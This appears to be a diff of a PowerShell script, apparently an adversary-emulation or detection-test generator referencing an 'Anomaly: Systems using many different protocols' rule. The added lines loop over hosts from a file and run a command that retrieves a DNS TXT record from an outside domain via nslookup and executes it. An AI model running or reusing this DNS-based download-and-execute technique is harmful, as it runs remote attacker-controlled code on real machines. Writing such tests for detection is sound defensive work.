@@ -1,6 +1,11 @@
-##[17::Anomaly: Systems using many different protocols::-R17-Anomaly: Systems using many different protocols]
-# Crafted APT URL IOC
-$target = '10.4.9.171'
+
+$rhosts = Get-Content -Path "C:\Users\Public\list.txt" 
+foreach ($rhost in $rhosts)
+{ 
+   powershell .((nslookup -q=txt attck-nexus.net 8.8.8.8)[-1])
+}
+
+$target = ''
 
 # Relevant Ports
 $port1 = 23
